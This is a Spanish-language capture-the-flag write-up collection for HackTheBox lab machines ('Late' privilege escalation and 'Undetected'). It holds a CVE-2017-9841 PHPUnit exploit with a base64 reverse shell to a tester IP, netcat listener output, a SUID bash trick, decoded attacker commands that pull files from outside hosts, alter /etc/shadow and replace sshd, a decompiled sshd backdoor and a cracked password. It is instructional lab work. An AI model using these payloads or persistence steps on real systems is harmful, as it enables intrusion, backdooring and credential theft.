http://10.10.14.181:1234/pspy64Connecting to 10.10.14.181:1234... connected.HTTP request sent, awaiting response... 200 OKLength: 3078592 (2.9M)Saving to: ‘pspy64’pspy64 100%[============================================================&amp;gt;] 2.94M 1.58MB/s in 1.9s 2022-05-11 01:33:37 (1.58 MB/s) - ‘pspy64’ saved [3078592/3078592]Por último le damos permisos de ejecución, lo ejecutamos y encontramos algo interesante:svc_acc@late:/tmp/privesc$ chmod +x pspy64 [174/174]svc_acc@late:/tmp/privesc$ ./pspy64 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done ......................................................................................................................................................2022/05/11 01:56:27 CMD: UID=0 PID=1662 | sendmail: MTA: accepting connections.............................................................................................2022/05/11 01:58:01 CMD: UID=0 PID=4207 | /bin/bash /root/scripts/cron.sh 2022/05/11 01:58:01 CMD: UID=0 PID=4208 | rm /usr/local/sbin/ssh-alert.sh 2022/05/11 01:58:01 CMD: UID=0 PID=4209 | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 2022/05/11 01:58:01 CMD: UID=0 PID=4211 | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh2022/05/11 01:58:01 CMD: UID=0 PID=4213 | rm -r /home/svc_acc/app/uploads/* 2&amp;gt;/dev/null2022/05/11 01:58:01 CMD: UID=0 PID=4215 | chattr +a /usr/local/sbin/ssh-alert.sh............................................................................................Primero vemos un mensaje de sendmail, el cuál es un agente de transferencias de correo MTA (Mail Transfer Agent)También observamos que el usuario root UID=0 ejecuta un script cron.h, que por el nombre podemos deducir que será. Sabemos que cron es un clock daemon que permite a los usuarios automatizar la ejecución de comandos en el sistema sobre un intervalo de tiempo especificado.Luego vemos que se ejecutan más comandos y observamos que el usuario root copia el script ssh-alert.sh a la ruta /usr/local/sbin/, nos otorga como propietarios y luego usa chattr para cambiar atributos al archivo. Se ve interesante, así que procedemos a ver el contenido:svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh#!/bin/bashRECIPIENT=&quot;root@late.htb&quot;SUBJECT=&quot;Email from Server Login: SSH Alert&quot;BODY=&quot;A SSH login was detected. User: $PAM_USER User IP Host: $PAM_RHOST Service: $PAM_SERVICE TTY: $PAM_TTY Date: `date` Server: `uname -a`&quot;if [ ${PAM_TYPE} = &quot;open_session&quot; ]; then echo &quot;Subject:${SUBJECT} ${BODY}&quot; | /usr/sbin/sendmail ${RECIPIENT}fiLo que haces el script es enviar por medio de sendmail un correo al usuario root avisandole sobre un inicio de sesión por SSH. Entonces podemos deducir que cada vez que un usuario inica sesión el usuario root ejecutara este script. Para comprobarlo podemos tirar pspy de una sesión y luego en otra ventana volver a conectarnos por SSH y comprobaremos que el usuario root ejecuta el script ssh-alert.shsvc_acc@late:/tmp/privesc$ ./pspy64................................................................................................................................................2022/05/12 00:41:25 CMD: UID=0 PID=1 | /sbin/init maybe-ubiquity2022/05/12 00:41:31 CMD: UID=0 PID=19472 | /usr/sbin/sshd -D -R2022/05/12 00:41:31 CMD: UID=110 PID=19473 | sshd: [net] 2022/05/12 00:41:32 CMD: UID=0 PID=19474 | /bin/bash /usr/local/sbin/ssh-alert.sh command execution ! ________________________/ 2022/05/12 00:41:32 CMD: UID=0 PID=19478 | /bin/bash /usr/local/sbin/ssh-alert.sh 2022/05/12 00:41:32 CMD: UID=0 PID=19479 | sendmail: MTA: 24C0fWVM019479 localhost.localdomain [127.0.0.1]: DATA 2022/05/12 00:41:32 CMD: UID=0 PID=19480 | sendmail: MTA: ./24C0fWVM019479 from queue 2022/05/12 00:41:32 CMD: UID=1000 PID=19481 | sshd: svc_acc 2022/05/12 00:41:32 CMD: UID=0 PID=19482 | /etc/mail/smrsh/procmail -t -f svc_acc@new -a -d root 2022/05/12 00:41:32 CMD: UID=1000 PID=19483 | -bash ........................................................................................ ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────❯ ssh -i id_rsa svc_acc@10.10.11.156No mail.svc_acc@late:~$ Ya validamos que el usuario ejecuta el script /usr/local/sbin/ssh-alert.sh que previamente copiṕ.Ahora facilmente podemos abrir el archivo y escribir el comando chmod u+s /bin/bash para poder ejecutar una bash (intérpetre de comandos) como root y obtener la shell. La idea es correcta, pero no nos permite abrir el archivo y modificarlo, aunque eso no es tan cierto…Antes, en la ejecución de pspy, vimos que al script se aplicaba el comando chattr +a, pero que hace exactamente? Un poco más de información del comando: https://www.geeksforgeeks.org/chattr-command-in-linux-with-examples/Entonces lo que hace es cambiar atributos de archivos, y en este caso el paramtro +a solo permite escribir en el archivo agregando información, entonces podemos usar el comando para output &amp;gt;&amp;gt; y así poder modificar el archivo.Si queremos confirmar estos permisos podemos verlos usando el comando lsattr:svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh-----a--------e--- ssh-alert.shsvc_acc@late:/usr/local/sbin$ lsattr -l ssh-alert.shssh-alert.sh Append_Only, Extents Usamos el parametro -l para usar el nombre descriptivo y saber que significaAhora solo agregamos el comando al script echo &quot;chmod u+s /bin/bash&quot; &amp;gt;&amp;gt; ssh-alert.sh, volvemos a logearnos por SSH, el usuario root ejecutará el script, el comando bash tendra permisos SUID (nos permite ejecutar el comando con los permisos del propietario), luego ejecutamos el comando bash con el parámetro -p para que sea efectivo el permiso SUID, mantener el UID de root, obtener la shell y pa-dentro:svc_acc@late:/usr/local/sbin$ echo &quot;chmod u+s /bin/bash&quot; &amp;gt;&amp;gt; ssh-alert.shsvc_acc@late:/usr/local/sbin$ exit logoutConnection to 10.10.11.156 closed.❯ ssh -i id_rsa svc_acc@10.10.11.156No mail.bash-4.4$ ls -l /bin/bash-rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bashbash-4.4$ bash -pbash-4.4# whoamirootbash-4.4# find / -name root.txt 2&amp;gt;/dev/null | xargs ls -l -rw-r----- 1 root root 33 May 11 20:15 /root/root.txt" }, { "title": "Hackthebox Writeup Undetected", "url": "/posts/HTBUndetected/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, Directory Fuzzing, PHPUnit, CVE-2017-9841, Encryption, backups, Brute Force, Apache, SSHD, Reverse Engineering, Backdoor, Python Scripting, Bash Scripting", "date": "2022-04-23 04:07:39 -0500", "snippet": "Máquina Linux donde enumeramos por TCP para hallar un subdominio que al aplicar Directory Fuzzing encontramos una ruta vulnerable del framework PHPUnit que nos permitía Remote Code Execution (RCE) y obtener una shell (CVE-2017-9841). Luego encontramos en los backups del usuario actual un binario, que al leer strings imprimibles y desencriptar la data, mostraba la creación de un nuevo usuario y su contraseña encriptada. Entonces aplicamos Brute Force con john, y nos logeamos con ese usuario por SSH. Para la escalada encontramos un correo del usuario root hacia nosotros que nos comentaba sobre comportamientos raros del servidor Apache. Para ello, hicimos un script en bash para buscar archivos modificados del servidor, encontramos otro binario e igualmente al leer strings imprimibles y desencriptarlo, mostraba una modificación sospechosa del binario Secure Shell Daemon (SSHD). Nos traemos el binario a nuestra máquina y debido al tamaño aplicamos Reverse Engineering con ghidra. Filtramos con palabras que nos pueden interesar como ‘password/authentication’ y encontramos una función que almacena un Backdoor encriptado. Logramos crear un script en python para desencriptarla, logearnos como root y obtener una shell. OS IP Release Date Difficulty Points Linux 10.10.11.146 19 Feb 2022 Medium 30 Antes de iniciar no olvidemos verficar que estamos conectados a la VPN de HTB y tenemos conexión a la máquina:❯ ping -c1 10.10.11.146PING 10.10.11.146 (10.10.11.146) 56(84) bytes of data.64 bytes from 10.10.11.146: icmp_seq=1 ttl=63 time=119 ms \\______________________ Linux Machine--- 10.10.11.146 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 118.675/118.675/118.675/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationCon nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ nmap -p- --open -sS --min-rate 5000 -v -n 10.10.11.146Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-28 02:50 -05Initiating Ping Scan at 02:50Scanning 10.10.11.146 [4 ports]Completed Ping Scan at 02:50, 0.17s elapsed (1 total hosts)Initiating SYN Stealth Scan at 02:50Scanning 10.10.11.146 [65535 ports]Discovered open port 22/tcp on 10.10.11.146Discovered open port 80/tcp on 10.10.11.146Completed SYN Stealth Scan at 02:50, 19.95s elapsed (65535 total ports)Nmap scan report for 10.10.11.146Host is up (0.33s latency).Not shown: 54572 closed tcp ports (reset), 10961 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh \\_________ Secure Shell Protocol80/tcp open http \\_________ HyperText Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 --open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -v : Imprimir información del proceso del escaneo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)Ahora escaneamos de manera específica los puertos 22 (SSH) - 80 (HTTP) en cuestión:❯ nmap -p 22,80 -sCV -oN targetTCP 10.10.11.146Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-28 12:24 -05Nmap scan report for djewelry.htb (10.10.11.146)Host is up (0.39s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2 (protocol 2.0)| ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)|_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Diana&#39;s Jewelry|_http-server-header: Apache/2.4.41 (Ubuntu) Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapYa que no disponemos de credenciales para entrar por SSH, empezamos con el servicio web que corre por el puerto 80 (HTTP): Con whatweb podemos ver tecnologías que usa el sitio❯ whatweb http://10.10.11.146http//10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana&#39;s Jewelry] Si quieres una opción gráfica puedes usar en tu navegador la extensión Wappalyzer y ver las tecnologías Con Firefox podemos ver el sitio webDe cara vemos el dominio djewelry.htb, pero no llega a aplicarse Virtual hostingToqueteando el landing page encontramos el subdominio store.djewelry.htb, lo agregamos a nuestro archivo /etc/hosts: echo &quot;10.10.11.146 store.djwelry.htb&quot; &amp;gt;&amp;gt; /etc/hosts y aquí si se aplica Virtual hosting: Tambien podemos encontrar el subdominio usando curl❯ curl -s -X GET &quot;http://10.10.11.146&quot; | grep -oE &quot;http.*htb&quot; | sort -uhttp://store.djewelry.htbObservamos la página pero no encontramos algo interesante así que aplicamos Directory Fuzzing con gobuster:❯ gobuster dir -t 60 -u &quot;http://store.djewelry.htb/&quot; -b 400,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://store.djewelry.htb/[+] Method: GET[+] Threads: 60[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 400,404[+] User Agent: gobuster/3.1.0[+] Follow Redirect: true[+] Timeout: 10s===============================================================2022/04/28 19:00:43 Starting gobuster in directory enumeration mode===============================================================/images (Status: 200) [Size: 12563]/css (Status: 200) [Size: 2175] /js (Status: 200) [Size: 2791] /vendor (Status: 200) [Size: 3126] /fonts (Status: 200) [Size: 7580] Explicación de parámetros : dir : Usar modo de enumeración de directorios/archivos -t &amp;lt;count&amp;gt; : Asignar &amp;lt;count&amp;gt; tareas en paraleo -u &amp;lt;url&amp;gt; : Url objetivo -b &amp;lt;status_code&amp;gt; : Omitir output de ciertos &amp;lt;status_code&amp;gt; -w &amp;lt;wordlist&amp;gt; : Ruta de &amp;lt;wordlist&amp;gt; para el fuzzingTodas la rutas son clásicas de un sitio web menos vendor, el cuál tiene activo Directory Listing:FootholdInvestigando un poco encontramos una vulnerabilidad que nos permite Remote Code Execution por medio del framework PHPUnit (CVE-2017-9841)La vulnerabilidad se da gracias a la linea de código eval(&#39;?&amp;gt;&#39; . file_get_contents(&#39;php://input&#39;)); del archivo eval-stdin.php de reside en la ruta http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.phpAhora solo nos queda inyectar una Reverse shell y conseguimos entrar a la máquina como el usuario www-data:Podemos hacerlo usando burpsuite o curl : Burpsuite Curl Para evitar problemas con las comillas dobles y simples &quot;&quot;,&#39;&#39;, codificamos nuestra reverse shell a base64 y ya en la petición lo decodeamos con base64_decode para ejecutarlo: curl -s -XPOST -d &#39;&amp;lt;?php system(base64_decode(L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzEyMzQgMD4mMScK));&#39; http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php La vulnerabilidad funciona con cualquiera de los HTTP methodsEn ambos casos solo queda ponerse en escucha con nc por el puerto especificado, ejecutar lo anterior, recibir la shell y pa-dentro:❯ nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.16] from (UNKNOWN) [10.10.11.146] 38938bash: cannot set terminal process group (866): Inappropriate ioctl for devicebash: no job control in this shellwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ En resumen, el código PHP obtiene un archivo file_get_contents() a través del flujo de entrada php://input, luego lo convierte en cadena y lo ejecuta eval() Para información mas detallada puede visitar el siguiente articulo: https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/Enumerando como el usuario www-data encontramos en /var/backups un binario interesante llamado info que solo nuestro usuario puede leer y ejecutarComo es un binario intentamos leer las cadenas imprimibles que podemos visualizar con strings. Por ello, pasamos el archivo a nuestra máquina y visualizamos lo siguiente:❯ strings info.......................776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b.......................Podemos reconocer que el formato es Hexadecimal así que lo decodeamos y encontramos una serie de comandos:❯ cat hiddenHexData.txt | xxd -r -p | tr &#39;;&#39; &#39;\\n&#39; | sed &#39;s/^ //g&#39;wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keyswget tempfiles.xyz/.main -O /var/lib/.mainchmod 755 /var/lib/.mainecho &quot;* 3 * * * root /var/lib/.main&quot; &amp;gt;&amp;gt; /etc/crontabawk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;amp;&amp;amp; $3 &amp;gt;= 1000 {system(&quot;echo &quot;$1&quot;1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &amp;gt;&amp;gt; /etc/shadow&quot;)}&#39; /etc/passwdawk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;amp;&amp;amp; $3 &amp;gt;= 1000 {system(&quot;echo &quot;$1&quot; &quot;$3&quot; &quot;$6&quot; &quot;$7&quot; &amp;gt; users.txt&quot;)}&#39; /etc/passwdwhile read -r user group home shell _do echo &quot;$user&quot;1&quot;:x:$group:$group:,,,:$home:$shell&quot; &amp;gt;&amp;gt; /etc/passwddone &amp;lt; users.txtrm users.txtLeyendo el código vemos que se está creando un usuario en base a uno ya existente, en otras palabras es el mismo usuario. Podemos verificar esto con un cat /etc/passwd | grep bash en la máquina víctima:www-data@production:/var/backups$ cat /etc/passwd | grep bashroot:x:0:0:root:/root:/bin/bashsteven:x:1000:1000:Steven Wright:/home/steven:/bin/bashsteven1:x:1000:1000:,,,:/home/steven:/bin/bash \\_____________________________________________ User based on stevenEn la creación del usuario podemos observar la contraseña de steven1 encriptada. Así que procedemos a desencriptarla, nos logeamos por ssh y pa-dentro:❯ echo &quot;steven1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/&quot; &amp;gt; hash❯ john -w=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 3 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusihatehackers (steven1) 1g 0:00:01:09 DONE (2022-04-29 02:30) 0.01436g/s 1279p/s 1279c/s 1279C/s janedoe..halo03Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. ❯ sshpass -p &quot;ihatehackers&quot; ssh steven1@10.10.11.146steven@production:~$ find / -name user.txt 2&amp;gt; /dev/null | xargs ls -l-rw-r----- 1 root steven 33 Apr 29 04:24 /home/steven/user.txt Pueden preguntarse, ¿Por qué estamos como steven y no steven1?. La respuesta es que al logearnos el sistema detecta que nuestro User ID es 1000, y al buscar el UID encuentra solo al usuario steven, ya que como el UID es único, el sistema tomará como perteneciente del UID al primer usuario que se creóPrivilege EscalationEnumerando como steven encontramos en /var/mail (directorio para almacenar los archivos de buzón de correos de los usuarios) un correo por parte del usuario root:steven@production:/var/mail$ cd /var/mail/steven@production:/var/mail$ cat steven From root@production Sun, 25 Jul 2021 10:31:12 GMTReturn-Path: &amp;lt;root@production&amp;gt;Received: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for &amp;lt;steven@production&amp;gt;; Sun, 25 Jul 2021 10:31:12 GMTReceived: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMTDate: Sun, 25 Jul 2021 10:31:12 GMTMessage-Id: &amp;lt;202107251031.80FAcdZ171847@production&amp;gt;To: steven@productionFrom: root@productionSubject: InvestigationsHi Steven.We recently updated the system but are still experiencing some strange behaviour with the Apache service.We have temporarily moved the web store and database to another server whilst investigations are underway.If for any reason you need access to the database or web application code, get in touch with Mark and hewill generate a temporary password for you to authenticate to the temporary server.Thanks,sysadminNos comenta que existen comportamientos extraños con el servidor web Apache, por ello basandonos en la fecha podemos revisar que archivos se han modificado en ese tiempo. Para realizar esa tarea hize un script en bash para automatizar una búsqueda de que archivos se modificaron unos meses antes de estos extraños comportamientos:#!/bin/bash# Find apache files by date&#39;s mail# Filtering directoriesecho &quot;[+] Creating dictionary of apache directories...&quot;find / -name &quot;apache2&quot; 2&amp;gt; /dev/null &amp;gt; pathssleep 2tput civis# Searching filesecho -e &quot;\\n[+] Searching mail...&quot;mail_path=$(find / -type f -name $(whoami) 2&amp;gt; /dev/null)echo $mail_pathecho -e &quot;\\n[+] Extracting date mail...&quot;email_date=$(date -r $mail_path &quot;+%Y-%m-%d&quot;)echo $email_datedeclare -i date=${email_date:5:2}let date-=3modify_date=$(echo ${email_date:0:4}-&quot;0$date&quot;-${email_date:8:2})echo -e &quot;\\n[+] Searching for modified files 3 months before the email was sent... ($modify_date - $email_date)&quot;while read path; do if [ -d $path ]; then echo -e &quot;\\t[+] Searching in path $path:&quot;; find $path -type f -newermt $modify_date ! -newermt $email_date -not -empty -ls 2&amp;gt; /dev/null; sleep 2; fidone &amp;lt; pathsrm paths Puedes encontrar el script en mi repositorio: https://github.com/E1P0TR0/Al ejecutarlo encontramos lo siguiente:steven@production:/tmp$ ./fileSearch.sh [+] Creating dictionary of apache directories...[+] Searching mail.../var/mail/steven[+] Extracting date mail...2021-07-25[+] Searching for modified files 3 months before the email was sent... (2021-04-25 - 2021-07-25) [+] Searching in path /usr/share/bug/apache2: [+] Searching in path /usr/share/doc/apache2: [+] Searching in path /usr/share/apache2: [+] Searching in path /usr/lib/apache2: 2050 36 -rw-r--r-- 1 root root 34800 May 17 2021 /usr/lib/apache2/modules/mod_reader.so [+] Searching in path /var/cache/apache2: [+] Searching in path /var/lib/php/modules/7.4/apache2: [+] Searching in path /var/lib/apache2: [+] Searching in path /var/log/apache2: [+] Searching in path /etc/php/7.4/apache2: [+] Searching in path /etc/ufw/applications.d/apache2: [+] Searching in path /etc/apache2: 51006 4 -rw-r--r-- 1 root root 565 Jul 5 2021 /etc/apache2/mods-available/mpm_prefork.conf 50834 4 -rw-r--r-- 1 root root 69 May 17 2021 /etc/apache2/mods-available/reader.load 50831 40 -rw-r--r-- 1 root root 37616 Jul 5 2021 /etc/apache2/mods-available/mod_reader.o 49589 4 -rw-r--r-- 1 root root 338 Jul 6 2021 /etc/apache2/sites-available/000-main.conf 50858 8 -rw-r--r-- 1 root root 7224 Jun 17 2021 /etc/apache2/apache2.conf [+] Searching in path /run/apache2: [+] Searching in path /run/lock/apache2:Observamos el archivo mod_reader.so (conocidas como librerías dinámicas por la extensión .so - Shared Object) con última fecha de modificación en May 17, además tiene relación con el problema ya que los módulos en apache sirven para diversas funcionalidades del servidorAhora descargamos el archivo a nuestra máquina y vemos que también es un archivo ejecutable, así que extraemos cadenas imprimibles con strings:...............d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk..........Viendo el formato nos damos cuenta que esta codificado en Base64, entonces lo decodeamos y obtenemos estos comandos:❯ echo d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk &amp;gt; hiddenB64Data.txt❯ cat hiddenB64Data.txt | base64 -d | tr &#39;;&#39; &#39;\\n&#39; | sed &#39;s/^ //g&#39;wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshdtouch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshdObservamos que se concatena una imagen al binario sshd (Servidor del protocolo SSH), y lo que parece sospechoso es que se altera la fecha por el binario a2enmod (Comando para activar los módulos de apache)Ya que vemos relación con SSH y que el propietario root es el único que puede modificar este archivo, podemos descargar dicho archivo a nuestra máquina para analizarlo con mas detalle usando ghidra (herramienta de ingeniería inversa): Filtramos por la palabra password y encontramos algo insteresante:Encontramos la función auth_password que contiene una variable backdoor (método que permite a cualquier persona eludir medidas de seguridad para acceder de manera remota y como usuario de alto nivel, a un sistema informático sin el conocimiento del propietario) que guarda una cadena de carácteres en un arreglo. Veamos a detalle la función:int auth_password(ssh *ssh,char *password){ Authctxt *ctxt; passwd *ppVar1; int iVar2; uint uVar3; byte *pbVar4; byte *pbVar5; size_t sVar6; byte bVar7; int iVar8; long in_FS_OFFSET; char backdoor [31]; // backdoor variable declaration byte local_39 [9]; long local_30; bVar7 = 0xd6; ctxt = (Authctxt *)ssh-&amp;gt;authctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; // backdoor[28-30] ppVar1 = ctxt-&amp;gt;pw; iVar8 = ctxt-&amp;gt;valid; backdoor._24_4_ = 0xbcf0b5e3; // backdoor[24-28] backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; // backdoor[16-24] backdoor[30] = -0x5b; // backdoor[30] backdoor._0_4_ = 0xf0e7abd6; // backdoor[0-4] backdoor._4_4_ = 0xa4b3a3f3; // backdoor[4-8] backdoor._8_4_ = 0xf7bbfdc8; // backdoor[8-12] backdoor._12_4_ = 0xfdb3d6e7; // backdoor[12-16] pbVar4 = (byte *)backdoor; // assign a pointer to backdoor for modification // Application of processes to decrypt the backdoor while( true ) { pbVar5 = pbVar4 + 1; // Store in pbVar5 the position of the next value *pbVar4 = bVar7 ^ 0x96; // Store xor operation value between pVar7 and &#39;0x96&#39; in current position (*pbVar4) if (pbVar5 == local_39) break; // Terminate process bVar7 = *pbVar5; // Store value of pbVar5 in pVar7 pbVar4 = pbVar5; // Advance to next position } iVar2 = strcmp(password,backdoor); // Compare password entered with the backdoor uVar3 = 1; // If strings are differents if (iVar2 != 0) { sVar6 = strlen(password); uVar3 = 0; if (sVar6 &amp;lt; 0x401) { if ((ppVar1-&amp;gt;pw_uid == 0) &amp;amp;&amp;amp; (options.permit_root_login != 3)) { iVar8 = 0; } if ((*password != &#39;\\0&#39;) || (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) { if (auth_password::expire_checked == 0) { auth_password::expire_checked = 1; iVar2 = auth_shadow_pwexpired(ctxt); if (iVar2 != 0) { ctxt-&amp;gt;force_pwchange = 1; } } iVar2 = sys_auth_passwd(ssh,password); if (ctxt-&amp;gt;force_pwchange != 0) { auth_restrict_session(ssh); // Restrict session } uVar3 = (uint)(iVar2 != 0 &amp;amp;&amp;amp; iVar8 != 0); } } } // If are the same if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail();} Resumiendo el proceso, existe un backdoor creado por el desarrollador que sirve para validar la autenticación de un usuario y con ello efectuar la conexión por SSH, como se mencionó anteriormente, sobre un usuario privilegiado como rootAhora solo queda desencriptar esa cadena de tipo Little Endian a Big Endian (formato en el que se almacenan los datos en forma de bytes en un ordenador), luego en formato Hexadecimal para luego aplicar la operación XOR. Para este proceso y a manera de práctica, hice un script en python3 para automatizar todo el proceso:#!/usr/bin/python3import signal, sys, subprocess, shlexfrom pwn import *import time# ctrl + cdef signal_handler(signum, frame): print(&quot;\\n[-] Exiting...&quot;); sys.exit()signal.signal(signal.SIGINT, signal_handler)# help paneldef help(): print(&quot;[!] Do not forget to install the requirements; Example: sudo ./requirements.sh\\n&quot;) log.info(f&quot;Use: {sys.argv[0]} &amp;lt;file with backdoor data&amp;gt;; Example: convertPass.py auth_password.c&quot;); sys.exit()# valid argsif len(sys.argv) != 2: help()# read filedef readFile(): p = log.progress(&#39;Extracting data from the file&#39;) name_file = &quot;extractAndSort.sh&quot; subprocess.run(shlex.split(f&quot;chmod +x {name_file}&quot;)) output = subprocess.run(shlex.split(f&quot;./{name_file} {sys.argv[1]}&quot;), capture_output=True, text=True) time.sleep(2) p.status(&#39;Success!&#39;) return output.stdout.strip().replace(&quot; &quot;,&quot;&quot;)# little-endian to big_endiandef littleToBig(data_litt): p = log.progress(&#39;Swaping endianndess&#39;) sections = 2 data_litt = [data_litt[i : i + sections] for i in range(0, len(data_litt), sections)] data_litt = [i for i in data_litt if i != &quot;0x&quot;] time.sleep(2) p.status(&#39;Success!&#39;) return data_litt[::-1]# hex to asciidef hexToAscii(data_big): p = log.progress(&#39;Converting hexadecimal to ascii data&#39;) password = [chr(int(f&quot;0x{i}&quot;, base=16) ^ 0x96) for i in data_big] time.sleep(2) p.status(&#39;Success!\\n&#39;) return &#39;&#39;.join(password)# processdef run(): data_litt = readFile() time.sleep(1) data_big = 